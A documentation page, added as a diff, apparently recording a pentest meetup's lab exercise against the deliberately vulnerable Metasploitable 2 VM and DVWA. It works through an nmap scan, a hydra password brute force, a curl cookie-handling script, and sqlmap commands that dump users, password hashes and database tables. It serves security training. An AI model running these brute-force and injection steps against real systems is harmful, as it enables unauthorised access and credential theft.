@@ -1,0 +1,200 @@
+.. include:: /pentest_links.txt
+
+.. _OwningDBwithSQLMap:
+
+*******************************
+Owning the Database with SQLMap
+*******************************
+
+This is to document the meetup’s efforts responding to the challenge `Owning the Database with SQLMap <https://pentestlab.wordpress.com/2012/11/24/owning-the-database-with-sqlmap/>`_.
+
+`Metasploitable <http://sourceforge.net/projects/metasploitable/files/Metasploitable2/>`_'s 64-bit Ubuntu 8.04 LTS (Hardy Heron) intentionally insecure VMware VM. `Metasploitable 2 Exploitability Guide <http://r-7.co/Metasploitable2>`_ describes the vulnerable services. Remember you can login using msfadmin/msfadmin, then ``sudo -i`` to become root. The DVWA Security page at http://VULNERABLE/dvwa/security.php can set the security level to one of low (no protection), medium (inadequate protection), or high (secure).
+
+See :ref:`Metasploitable2Setup` for details of settup up and using the vulnerable host.
+
+
+Owning the Database reconnaissance
+==================================
+
+Although we are told the URL for the SQL injections, let's pretend we need to do an ``nmap`` reconnaissance, showing we have a web server on port 80 plus many other ports. In fact with so many ports open a follow-up scan ``nmap -p 0-65535 $TARGET`` is probably warranted if port 80 doesn't work.
+
+.. code-block:: console
+
+  hacker@kali:~$ TARGET=192.168.1.102
+  hacker@kali:~$ sudo nmap -Pn -sV -O $TARGET
+  ###################### SNIP ######################
+  Nmap scan report for 192.168.1.102
+  Host is up (0.00085s latency).
+  Not shown: 977 closed ports
+  PORT     STATE SERVICE     VERSION
+  21/tcp   open  ftp         vsftpd 2.3.4
+  22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+  23/tcp   open  telnet      Linux telnetd
+  25/tcp   open  smtp        Postfix smtpd
+  53/tcp   open  domain      ISC BIND 9.4.2
+  80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
+  111/tcp  open  rpcbind     2 (RPC #100000)
+  139/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
+  445/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
+  512/tcp  open  exec        netkit-rsh rexecd
+  513/tcp  open  login?
+  514/tcp  open  tcpwrapped
+  1099/tcp open  rmiregistry GNU Classpath grmiregistry
+  1524/tcp open  shell       Metasploitable root shell
+  2049/tcp open  nfs         2-4 (RPC #100003)
+  2121/tcp open  ftp         ProFTPD 1.3.1
+  3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
+  5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
+  5900/tcp open  vnc         VNC (protocol 3.3)
+  6000/tcp open  X11         (access denied)
+  6667/tcp open  irc         Unreal ircd
+  8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
+  8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
+  MAC Address: 52:54:00:58:F8:A2 (QEMU Virtual NIC)
+  Device type: general purpose
+  Running: Linux 2.6.X
+  OS CPE: cpe:/o:linux:linux_kernel:2.6
+  OS details: Linux 2.6.9 - 2.6.33
+  Network Distance: 1 hop
+  Service Info: Hosts:  metasploitable.localdomain, localhost, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+  OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+  Nmap done: 1 IP address (1 host up) scanned in 31.50 seconds
+
+Owning the Database password cracking
+=====================================
+
+A little probing around the site came up with a login form at http://$TARGET/dvwa/login.php with a huge "Hint: default username is admin with password password". Although we already have the username/password, let's at learn a little by doing a brute force crack of the password. We note the login form fields are username, password, and Login. Unsuccessful logins get the message "Login failed". There are a number of tools that could be used to crack the form's password: `Burp Suite`_, `hydra`, `Medusa <http://foofus.net/goons/jmk/medusa/medusa.html>`_, and more. We illustrate using `hydra`_ to crack the password. (See `Using Hydra to dictionary-attack web-based login forms <http://insidetrust.blogspot.com/2011/08/using-hydra-to-dictionary-attack-web.html>`_ for an example.)
+
+.. code-block:: console
+
+  hacker@kali:~$ TARGET=192.168.1.102
+  hacker@kali:~$ # To see the format for http-post-form
+  hacker@kali:~$ hydra -U http-post-form
+  ###################### SNIP ######################
+  hacker@kali:~$ # Password list
+  hacker@kali:~$ zcat /usr/share/wordlists/rockyou.txt.gz > rockyou.txt
+  hacker@kali:~$ # Just try to crack the username "admin"
+  hacker@kali:~$ hydra $TARGET  http-post-form \
+    "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" \
+    -l admin -P rockyou.txt 
+  Hydra v7.6 (c)2013 by van Hauser/THC & David Maciejak - for legal purposes only
+
+  Hydra (http://www.thc.org/thc-hydra) starting at 2014-11-16 20:53:24
+  [DATA] 16 tasks, 1 server, 14344399 login tries (l:1/p:14344399), ~896524 tries per task
+  [DATA] attacking service http-post-form on port 80
+  [80][www-form] host: 192.168.1.102   login: admin   password: password
+  1 of 1 target successfully completed, 1 valid password found
+  Hydra (http://www.thc.org/thc-hydra) finished at 2014-11-16 20:53:33
+
+So now we can login using admin/password. A true pentesting triumph with the subtlety of driving a tank through the front door. From there we see a link http://$TARGET/dvwa/vulnerabilities/sqli/ which is our SQL injection target.
+
+
+Owning the Database cookies
+===========================
+
+The SQL injection is password-protected via a login form. See `curl HTML forms explained <http://curl.haxx.se/docs/httpscripting.html#Forms_explained>`_, `curl Cookies <http://curl.haxx.se/docs/httpscripting.html#Cookie_Basics>`_, and `curl Web Login <http://curl.haxx.se/docs/httpscripting.html#Some_login_tricks>`_ for some basic background material. See `What are all those entries in my cookies.txt file?  <http://www.cookiecentral.com/faq/#3.5>`_ for the Netscape cookie file format.
+
+Since cookies are required, we login saving the cookies to a file using ``curl --cookie-jar FILENAME ...`` and use that to set a COOKIES variable. However, the DVWA Security page at http://$TARGET/dvwa/security.php states that you can set the security level to one of low, medium, or high. The default cookie you get sets it to "high" which appears to disallow SQL injection (see `Is it possible to do SQL injection (HIGH Level) on Damn Vulnerable Web App? <https://security.stackexchange.com/questions/43294/is-it-possible-to-do-sql-injection-high-level-on-damn-vulnerable-web-app>`_). So we'll change the security cookie to "medium" to allow SQL injection.
+
+NOTE: `Kali Linux - DVWA - Sql Injection (Low- Medium- High) <https://www.youtube.com/watch?v=I5nrCCL4LIc>`_ seems to show what we do below working with security level "high" (with the only difference being `sqlmap`_ option "--string=Surname"). But when you look at the quickly-flashing-by-screen it shows the query ``id=1' AND SLEEP(5) AND 'Bksm'='Bksm&Submit=Submit`` was successful for SQL injection. Feeding that back into the running DVWA you'll see that doesn't work at security level "high". The video did not use the iso we did, rather the DVWA version `RandomStorm/DVWA <https://github.com/RandomStorm/DVWA>`_ running on `XAMPP <https://www.apachefriends.org/index.html?ModPagespeed=noscript>`_ and perhaps that is the root of the difference.
+
+A note of warning: when passing a cookie string be very careful about the format. For example, "PHPSESSID=2b27bc2ffbedb87596add46a63bb1a10; security=low" works, but "PHPSESSID=2b27bc2ffbedb87596add46a63bb1a10;security=low" (leaving out the space after ";") will fail.
+
+Here is the script you can cut/paste to get a PHPSESSID and security cookie in to shell variable COOKIES:
+
+.. code-block:: bash
+
+  TARGET=192.168.1.102
+  SECURITY=medium
+  URL_LOGIN="http://$TARGET/dvwa/login.php"
+  URL_SQLI="http://$TARGET/dvwa/vulnerabilities/sqli/"
+  COOKIES_FILE=cookies.txt
+  cat /dev/null > $COOKIES_FILE
+
+  curl -v --cookie-jar "$COOKIES_FILE" \
+          --form username="admin" \
+          --form password="password" \
+          --form Login="Login" \
+          $URL_LOGIN 2>&1 | grep Cookie
+
+  # Get the cookies file data into a variable, changing each \n to a space
+  COOKIES=$(tail -n +5 $COOKIES_FILE | cut -f6,7 | sed -e 's/\t/=/;s/$/;/')
+  COOKIES=${COOKIES//$'\n'/ }
+
+  # Change security cookie to desired value
+  COOKIES="${COOKIES%%security=*}security=$SECURITY;${COOKIES#*security=*;}"
+
+  # Test that the cookies are passed
+  curl -v --head --cookie "$COOKIES" $URL_SQLI 2>&1 | grep Cookie
+
+The output from running this code is:
+
+.. code-block:: console
+
+  hacker@kali:~$ TARGET=192.168.1.102
+  hacker@kali:~$ SECURITY=medium
+  hacker@kali:~$ URL_LOGIN="http://$TARGET/dvwa/login.php"
+  hacker@kali:~$ URL_SQLI="http://$TARGET/dvwa/vulnerabilities/sqli/"
+  hacker@kali:~$ COOKIES_FILE=cookies.txt
+  hacker@kali:~$ cat /dev/null > $COOKIES_FILE
+  hacker@kali:~$ 
+  hacker@kali:~$ curl -v --cookie-jar "$COOKIES_FILE" \
+  >         --form username="admin" \
+  >         --form password="password" \
+  >         --form Login="Login" \
+  >         $URL_LOGIN 2>&1 | grep Cookie
+  < Set-Cookie: PHPSESSID=5531c5ed9cfe75dd08ecd87c93a5a05b; path=/
+  < Set-Cookie: security=medium
+  hacker@kali:~$ 
+  hacker@kali:~$ # Get the cookies file data into a variable, changing each \n to a space
+  hacker@kali:~$ COOKIES=$(tail -n +5 $COOKIES_FILE | cut -f6,7 | sed -e 's/\t/=/;s/$/;/')
+  hacker@kali:~$ COOKIES=${COOKIES//$'\n'/ }
+  hacker@kali:~$ 
+  hacker@kali:~$ # Change security cookie to desired value
+  hacker@kali:~$ COOKIES="${COOKIES%%security=*}security=$SECURITY;${COOKIES#*security=*;}"
+  hacker@kali:~$ 
+  hacker@kali:~$ # Test that the cookies are passed
+  hacker@kali:~$ curl -v --head --cookie "$COOKIES" $URL_SQLI 2>&1 | grep Cookie
+  > Cookie: PHPSESSID=5531c5ed9cfe75dd08ecd87c93a5a05b; security=medium;
+
+
+Owning the Database sqlmap
+==========================
+
+Now we have the cookies for `sqlmap`_ to work. Here's the script we'll be executing (assuming COOKIES are set from above):
+
+.. code-block:: bash
+
+  TARGET=192.168.1.102
+  URL_SQLI="http://$TARGET/dvwa/vulnerabilities/sqli/"
+
+  sqlmap --cookie="$COOKIES" -u "${URL_SQLI}?id=1&Submit=Submit" \
+      --batch --output-dir $PWD/sqlmap \
+      --dbs
+
+  sqlmap --cookie="$COOKIES" -u "${URL_SQLI}?id=1&Submit=Submit" \
+      --dbms mysql --batch --output-dir $PWD/sqlmap \
+      --fingerprint --banner --current-user --is-dba --current-db --hostname
+
+  sqlmap --cookie="$COOKIES" -u "${URL_SQLI}?id=1&Submit=Submit" \
+      --dbms mysql --batch --output-dir $PWD/sqlmap \
+      --users --passwords --privileges --roles
+
+  sqlmap --cookie="$COOKIES" -u "${URL_SQLI}?id=1&Submit=Submit" \
+      --dbms mysql --batch --output-dir $PWD/sqlmap \
+      -D dvwa --tables
+
+  sqlmap --cookie="$COOKIES" -u "${URL_SQLI}?id=1&Submit=Submit" \
+      --dbms mysql --batch --output-dir $PWD/sqlmap \
+      -D dvwa --columns
+
+  sqlmap --cookie="$COOKIES" -u "${URL_SQLI}?id=1&Submit=Submit" \
+      --dbms mysql --batch --output-dir $PWD/sqlmap \
+      -D dvwa --dump
+
+
+And here goes the results of running these commands, showing we have admin access to the database:
+
+.. literalinclude:: /challenges/owning_database_with_sqlmap_sqlmap.con
+   :language: console
